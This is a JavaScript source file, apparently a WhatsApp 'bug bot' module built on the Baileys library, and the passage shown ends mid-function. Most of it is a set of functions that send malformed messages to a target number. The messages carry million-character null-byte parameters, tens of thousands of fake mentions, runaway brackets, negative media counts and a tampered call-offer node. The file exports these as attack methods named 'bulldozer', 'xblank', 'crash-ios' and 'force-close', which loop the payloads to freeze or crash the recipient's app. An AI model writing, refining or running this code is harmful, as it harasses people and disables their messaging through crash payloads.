import { generateWAMessageFromContent, prepareWAMessageMedia, generateWAMessage, proto, encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage } from "baileys";
import crypto from "crypto";
import fs from "fs";
import chalk from "chalk";

const cihuy = Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAAAAgMEAQUBAQADAQAAAAAAAAAAAAAAAAUCAwQB/9oADAMBAAIQAxAAAADQBgiiyUpiMRT3vLsvN62wHjoyhr2+hRbQgh10QPSU23aa8mtJCxAMOwltmOwUV9UCif/EACAQAAICAQQDAQAAAAAAAAAAAAECAAMRBBASQSAhMTL/2gAIAQEAAT8A87dRXUQD9MR1sGR4U1VW2O7DLAwoqWMF3uc1oSBNAHBsdgfYlFhNjqd9R+FUdypVFSLKqqxa7Be5cvFztYpZlz1FxGbg2RLWD8W2tOBFsyoxMl3Ajn2AOttSwAEV5QQQzb6wkcIbSBK7XxgGD4J//8QAIhEBAAICAQIHAAAAAAAAAAAAAQACAxIhBBAREyMxUWGS/9oACAECAQE/AJrYNvDjtWrZAmWvop8HbpdRss45mauuSxMAv7JYNWXs2srOnXzaH3GPuz//xAAiEQACAQMEAgMAAAAAAAAAAAABAgADERIEECExE2EkMlH/2gAIAQMBAT8AmDBcsTb92RWdgqjmV0+MVA6G2jsM2l7SuuNVx7lAHD0XWfbiVGLuzGadj5EW/F9j2Z//2Q==", "base64");
const BullCrash = cihuy;
const foto = cihuy;
const namaOwner = "Liora";
const botname2 = "Liora Bot";

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function callinvisible(sock, target) {
    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "@malzxyz",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                },
                contextInfo: {
                    participant: { jid: target },
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () =>
                            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                        )
                    ]
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: {
                                    jid: target
                                },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

async function DelayInvisibleXx(sock, target) {
    const mentioned = Array.from({ length: 10 }, () => "0@s.whatsapp.net");
    const invisibleChar = '\u2063';
    const longText = invisibleChar.repeat(500000) + "@0".repeat(50000);

    const payload = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 9999,
                            degreesLongitude: 9999
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: longText
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: mentioned
                    }
                },
                groupStatusMentionMessage: {
                    groupJid: target,
                    mentionedJid: mentioned,
                    contextInfo: {
                        mentionedJid: mentioned
                    }
                }
            }
        }
    };

    try {
        await sock.relayMessage(target, payload, {
            participant: { jid: target, count: '0' },
            messageId: undefined
        });
    } catch (err) {
        console.error(`❌ Failed to send delay message:`, err);
    }
}

async function delayMakerInvisible(sock, target) {
    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    connCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    markOnlineOnconnCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    generateHighQualityLinkPreview: false,
                    mobile: true
                }
            }
        }
    });

    let stanza = [{
        attrs: { biz_bot: "1" },
        tag: "bot"
    }, {
        attrs: {},
        tag: "biz"
    }];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `DELAY - 🩸${"MARKER - 🩸".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `𝐉𝚺͢𝐗𝐏𝐋𝚹𝐈𝐓-𝐗 - 🩸 ${"﹏".repeat(102002)}`
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"]
                    },
                    body: { text: " " + "ꦽ".repeat(102002) + " ".repeat(102002) },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 15 }, () => ({
                            name: "single_select",
                            buttonParamsJson: venomModsData + " ".repeat(9999)
                        }))
                    }
                }
            },
            additionalNodes: stanza,
            stanzaId: `stanza_${Date.now()}`
        }
    };

    await sock.relayMessage(target, message, {
        participant: { jid: target, count: '0' }
    });
}

async function DelayNative(sock, target, mention) {
    let message = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "!",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_message",
                        paramsJson: "\x10".repeat(1000000),
                        version: 2
                    },
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined,
                            },
                        ],
                    },
                ],
            },
        ],
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function Jtwdlyinvis(sock, target) {
    let permissionX = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "⟅༑𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧𝐄𝐦𝐩𝐞𝐫𝐨𝐫⟅༑",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
        }
    );

    let permissionY = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "⏤͟͟͞͞𝐓𝐡𝐞𝐊𝐢𝐧𝐠 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧𝐳 ᝄ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
        }
    );

    await sock.relayMessage(
        "status@broadcast",
        permissionX.message,
        {
            messageId: permissionX.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );

    await sock.relayMessage(
        "status@broadcast",
        permissionY.message,
        {
            messageId: permissionY.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
}

async function crashnew(sock, target) {
    const payload = {
        contextInfo: {
            mentionedJid: [undefined, null],
            forwardingScore: -9999,
            isForwarded: true,
            participant: null,
            remoteJid: undefined,
            quotedMessage: {
                conversation: "\u0000".repeat(90000)
            }
        }
    }
    await sock.relayMessage(target, {
        albumMessage: {
            caption: " ─ raldzavgrs. ",
            mediaCount: -99999999,
            firstMedia: {},
            contextInfo: payload.contextInfo
        }
    }, { messageId: "alb_" + Date.now(), participant: { jid: target, count: '0' } });
    await sock.relayMessage(target, {
        contactMessage: {
            displayName: "\u0000".repeat(10000),
            vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:\nTEL;waid=666666666666:\nEND:VCARD",
            contextInfo: payload.contextInfo
        }
    }, { messageId: "ctc_" + Date.now(), participant: { jid: target, count: '0' } });
    await sock.relayMessage(target, {
        nativeFlowMessage: {
            buttons: [],
            messageParamsJson: "{[(".repeat(10000),
            flowToken: "",
            content: {
                title: "RALDZZ_TRIGGER",
                description: "\u0000".repeat(10000),
                buttonText: "\u0000".repeat(10000),
            },
            contextInfo: payload.contextInfo
        }
    }, { messageId: "flw_" + Date.now(), participant: { jid: target, count: '0' } });
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    caption: " ─ raldzavgrs. ",
                    jpegThumbnail: Buffer.alloc(1),
                    contextInfo: payload.contextInfo
                }
            }
        }
    }, { messageId: "vom_" + Date.now(), participant: { jid: target, count: '0' } });
}

async function BlackBlankTotal(sock, target, mention) {
    const photo = {
        image: BullCrash,
        caption: "Black Bull Bro"
    };

    const album = await generateWAMessageFromContent(target, {
        albumMessage: {
            expectedImageCount: 666,
            expectedVideoCount: 0
        }
    }, {
        userJid: target,
        upload: sock.waUploadToServer
    });

    await sock.relayMessage(target, album.message, { messageId: album.key.id });

    for (let i = 0; i < 10; i++) {
        const msg = await generateWAMessage(target, photo, {
            upload: sock.waUploadToServer
        });

        const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

        msg.message[type].contextInfo = {
            mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () =>
                    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            messageAssociation: {
                associationType: 1,
                parentMessageKey: album.key
            }
        };

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await sock.relayMessage(target, {
                statusMentionMessage: {
                    message: { protocolMessage: { key: msg.key, type: 25 } }
                }
            }, {
                additionalNodes: [
                    { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
                ]
            });
        }
    }
}

async function XProtexBlankChatV3(sock, target) {
    const Private = 'ោ៝'.repeat(10000);

    const msg = {
        newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "💣⃟𝑫‌𝑹‌‌꙰‌𝑨‌𝑮‌𝑶‌𝑵‌" + "ោ៝".repeat(20000),
            caption: "💣⃟𝑫‌𝑹‌‌꙰‌𝑨‌𝑮‌𝑶‌𝑵‌" + Private + "ោ៝".repeat(20000),
            inviteExpiration: "999999999",
        },
    };

    await sock.relayMessage(target, msg, {
        participant: { jid: target, count: '0' },
        messageId: null,
    });

    const messageCrash2 = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    body: {
                        text: "Hi I'm Cikiwir!!" + "ꦾ".repeat(2000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 11 }, () => ({
                            name: "single_select",
                            buttonParamsJson: "\u0000".repeat(1000),
                        }))
                    },
                },
            },
        },
    };
    await sock.relayMessage(target, messageCrash2, {
        participant: { jid: target, count: '0' },
    });
}

async function JtwStuck(sock, target) {
    try {
        const cards = Array.from({ length: 100 }, () => ({
            body: proto.Message.InteractiveMessage.Body.fromObject({ text: "Permission Emperor" }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "PT FUNCTION JTW" }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: '🦠'.repeat(2000),
                hasMediaAttachment: false
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
        }));

        const xsf = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

        const carousel = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 ᖫᖭ 𝐄𝐦𝐩𝐞𝐫𝐨𝐫 \n${"𑜦".repeat(1000)}:)\n\u0000`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: " www.jtwBuugs.com"
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: false
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: cards
                            }),
                            contextInfo: {
                                mentionedJid: [
                                    target,
                                    "0@s.whatsapp.net",
                                    ...Array.from({ length: 1900 }, () =>
                                        `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                    ),
                                ],
                                remoteJid: target,
                                participant: xsf,
                                stanzaId: "1234567890ABCDEF"
                            }
                        })
                    }
                }
            },
            { userJid: target }
        );

        await sock.relayMessage(target, carousel.message, {
            messageId: carousel.key.id,
            participant: { jid: target, count: '0' }
        });

        let message = {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                        mimetype: "image/webp",
                        directPath:
                            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                        fileLength: { low: 1, high: 0, unsigned: true },
                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                        isAnimated: true,
                        contextInfo: {
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 40000 }, () =>
                                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                                ),
                            ],
                        },
                    },
                },
            },
        };

        const msg = generateWAMessageFromContent(target, message, {});

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
                        },
                    ],
                },
            ],
        });

    } catch (err) {
        console.error("Error in function:", err);
    }
}

async function NexusChatAiCrash(sock, target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: { businessOwnerJid: target },
                        },
                        body: {
                            text: `https://finzz-modzz-shop-web-id.vercel.app‌${"​᭄".repeat(2500)}.com`
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                            buttons: [
                                { name: "single_select", buttonParamsJson: "" },
                                { name: "call_permission_request", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                            ],
                        },
                    },
                },
            },
        };

        await sock.relayMessage(target, message, {
            participant: { jid: target, count: '0' },
        });
    } catch (err) {
        console.log(err);
    }
}

async function EmpireUltimate(sock, target) {
    for (let i = 0; i < 5; i++) {
        const msg = await generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false,
                                liveLocationMessage: {
                                    degreesLatitude: -999.035,
                                    degreesLongitude: 922.9999,
                                    name: "Matrix",
                                    address: "Matrix"
                                }
                            },
                            body: { text: "( 👾 ) AcistàMatr¡x505¿" },
                            nativeFlowMessage: {
                                messageParamsJson: "{".repeat(10000),
                                buttons: [
                                    { name: "single_select", buttonParamsJson: "\u0000".repeat(999) },
                                    { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(999) },
                                    { name: "mpm", buttonParamsJson: "\u0000".repeat(999) },
                                    { name: "payment_status", buttonParamsJson: "\u0003" },
                                ]
                            },
                            contextInfo: {
                                remoteJid: "status@broadcast",
                                participant: target,
                                mentionedJid: [target, "13135550002@s.whatsapp.net"]
                            },
                        }
                    }
                }
            },
            {}
        );

        await sock.relayMessage(target, msg.message, {
            participant: { jid: target, count: '0' },
            messageId: msg.key.id
        });
    }
}

async function SkyForce(sock, target) {
    let listMessage = {
        title: "SkyC",
        sections: [],
        description: "",
        buttonText: "Click Here",
    };

    for (let i = 0; i < 5; i++) {
        const largeText = "ꦾ".repeat(10000);

        listMessage.sections.push({
            title: `OverLoad Dek ${i}`,
            rows: [
                {
                    title: largeText,
                    rowId: `crazy_payload_${i}`,
                    description: "SkySky 🔥",
                },
            ],
        });
    }

    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: { businessOwnerJid: target },
                        },
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: "SkyForce Payload\n" + "ꦾ".repeat(10000),
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                            subtitle: "Payload by Lalzz",
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify(listMessage),
                                },
                                { name: "call_permission_request", buttonParamsJson: "{}" },
                                { name: "mpm", buttonParamsJson: "{}" },
                            ],
                        }),
                    }),
                },
            },
        },
        { userJid: target }
    );

    await sock.relayMessage(target, msg.message, {
        participant: { jid: target, count: '0' },
        messageId: msg.key.id,
    });
}

async function DocuMorsh01(sock, target) {
    const msg = {
        stanza: [
            { attrs: { biz_bot: "1" }, tag: "bot" },
            { attrs: {}, tag: "biz" },
        ],
        message: {
            viewOnceMessage: {
                message: {
                    listResponseMessage: {
                        title: "𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 - 𝐄𝐦𝐩𝐞𝐫𝐨𝐫" + "ꦾ".repeat(4500),
                        listType: 2,
                        singleSelectReply: { selectedRowId: "𝐗𝐬𝐭𝐮𝐧𝐭...." },
                        contextInfo: {
                            stanzaId: sock.generateMessageTag(),
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target],
                        },
                        description: "INITIATED_BY_USER",
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                        },
                        body: { text: "\u0003" + "ꦾ".repeat(9999) },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "payment_method",
                                    buttonParamsJson: JSON.stringify({
                                        currency: "XXX",
                                        payment_configuration: "",
                                        payment_type: "",
                                        total_amount: { value: 1000000, offset: 100 },
                                        reference_id: "4SWMDTS1PY4",
                                        type: "physical-goods",
                                        order: {
                                            status: "payment_requested",
                                            description: "",
                                            subtotal: { value: 0, offset: 100 },
                                            order_type: "PAYMENT_REQUEST",
                                            items: [
                                                {
                                                    retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                                                    name: "KlearPay",
                                                    amount: { value: 1000000, offset: 100 },
                                                    quantity: 1,
                                                },
                                            ],
                                        },
                                        additional_note: "KlearPay",
                                        native_payment_methods: [],
                                        share_payment_status: false,
                                    }),
                                },
                            ],
                            messageParamsJson: "{".repeat(1000) + "[".repeat(1000),
                            version: 3,
                        },
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, msg.message, {
        additionalNodes: msg.stanza,
        participant: { jid: target, count: '0' },
    });
}

async function JtwForcloseX(sock, target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 9999999,
                            businessMessageForwardInfo: { businessOwnerJid: target },
                        },
                        body: { text: `⍣᳟` },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(5000),
                            buttons: [
                                {
                                    name: "payment_method",
                                    buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(0x2710)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
                                },
                            ],
                        },
                    },
                },
            },
        };
        await sock.relayMessage(target, message, {
            participant: { jid: target, count: '0' },
        });
    } catch (err) {
        console.log(err);
    }
}

async function FcOneMsg(sock, target) {
    try {
        let devices = (
            await sock.getUSyncDevices([target], false, false)
        ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

        await sock.assertSessions(devices)

        let xnxx = () => {
            let map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async prev => {
                        try { await prev; } catch { }
                        return fn();
                    })(map[key].task);
                    return map[key].task;
                }
            };
        };

        let Raza = xnxx();
        let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        let Cyber = sock.encodeWAMessage?.bind(sock) || encodeWAMessage;

        let originalCreateParticipantNodes = sock.createParticipantNodes;
        sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

            let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
            let memeg = Array.isArray(patched)
                ? patched
                : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

            let { id: meId, lid: meLid } = sock.authState.creds.me;
            let omak = meLid ? jidDecode(meLid)?.user : null;
            let shouldIncludeDeviceIdentity = false;

            let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
                let decodedJid = jidDecode(jid);
                let targetUser = decodedJid?.user;
                let { user: ownPnUser } = jidDecode(meId);
                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;
                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = Official(Cyber(msg));

                return Raza.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
                    if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
                    };
                });
            }));

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };

        try {
            let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

            let lemiting = {
                tag: "call",
                attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
                content: [{
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": sock.user.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },
                        { tag: "net", attrs: { medium: "3" } },
                        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                        { tag: "encopt", attrs: { keygen: "2" } },
                        { tag: "destination", attrs: {}, content: destinations },
                        ...(shouldIncludeDeviceIdentity ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                        }] : [])
                    ]
                }]
            };
            await sock.sendNode(lemiting);
        } finally {
            sock.createParticipantNodes = originalCreateParticipantNodes;
        }
    } catch (err) {
        console.error("onemsg error:", err);
    }
}

export const bugMethods = {
    "onemsg": (sock, target) => FcOneMsg(sock, target),
    "bulldozer": async (sock, target) => {
        console.log(chalk.cyan.bold(`[Bulldozer] Starting Hard Delay on ${target}...`));
        for (let i = 0; i < 10; i++) {
            await callinvisible(sock, target);
            await DelayInvisibleXx(sock, target);
            await delayMakerInvisible(sock, target);
            await DelayNative(sock, target);
            await Jtwdlyinvis(sock, target);
            console.log(chalk.green(`  - Stage ${i + 1}/10 sent`));
            await sleep(1000);
        }
        console.log(chalk.blue.bold(`[Bulldozer] Hard Delay completed.`));
    },
    "invisible": async (sock, target) => {
        console.log(chalk.cyan.bold(`[Invisible] Starting Hard Delay on ${target}...`));
        for (let i = 0; i < 10; i++) {
            await callinvisible(sock, target);
            await DelayInvisibleXx(sock, target);
            await delayMakerInvisible(sock, target);
            await DelayNative(sock, target);
            await Jtwdlyinvis(sock, target);
            console.log(chalk.green(`  - Stage ${i + 1}/10 sent`));
            await sleep(1000);
        }
        console.log(chalk.blue.bold(`[Invisible] Hard Delay completed.`));
    },
    "senjudelay": async (sock, target) => {
        console.log(chalk.cyan.bold(`[SenjuDelay] Starting Hard Delay on ${target}...`));
        for (let i = 0; i < 10; i++) {
            await callinvisible(sock, target);
            await DelayInvisibleXx(sock, target);
            await delayMakerInvisible(sock, target);
            await DelayNative(sock, target);
            await Jtwdlyinvis(sock, target);
            console.log(chalk.green(`  - Stage ${i + 1}/10 sent`));
            await sleep(1000);
        }
        console.log(chalk.blue.bold(`[SenjuDelay] Hard Delay completed.`));
    },
    "xblank": async (sock, target) => {
        console.log(chalk.magenta.bold(`[XBlank] Starting Blank Attack on ${target}...`));
        for (let i = 0; i < 10; i++) {
            await crashnew(sock, target);
            await BlackBlankTotal(sock, target);
            await XProtexBlankChatV3(sock, target);
            await JtwStuck(sock, target);
            console.log(chalk.green(`  - Stage ${i + 1}/10 sent`));
            await sleep(1000);
        }
        console.log(chalk.blue.bold(`[XBlank] Blank Attack completed.`));
    },
    "crash-ios": async (sock, target) => {
        console.log(chalk.magenta.bold(`[Crash-iOS] Starting Blank Attack on ${target}...`));
        for (let i = 0; i < 10; i++) {
            await crashnew(sock, target);
            await BlackBlankTotal(sock, target);
            await XProtexBlankChatV3(sock, target);
            await JtwStuck(sock, target);
            console.log(chalk.green(`  - Stage ${i + 1}/10 sent`));
            await sleep(1000);
        }
        console.log(chalk.blue.bold(`[Crash-iOS] Blank Attack completed.`));
    },
    "senjufc": async (sock, target) => {
        console.log(chalk.red.bold(`[SenjuFC] Starting Force Close Attack on ${target}...`));
        for (let i = 0; i < 10; i++) {
            await NexusChatAiCrash(sock, target);
            await EmpireUltimate(sock, target);
            await SkyForce(sock, target);
            await DocuMorsh01(sock, target);
            await JtwForcloseX(sock, target);
            console.log(chalk.green(`  - Stage ${i + 1}/10 sent`));
            await sleep(1000);
        }
        console.log(chalk.blue.bold(`[SenjuFC] Force Close Attack completed.`));
    },
    "force-close": async (sock, target) => {
        console.log(chalk.red.bold(`[Force-Close] Starting Force Close Attack on ${target}...`));
        for (let i = 0; i < 10; i++) {
            await NexusChatAiCrash(sock, target);
            await EmpireUltimate(sock, target);
            await SkyForce(sock, target);
            await DocuMorsh01(sock, target);
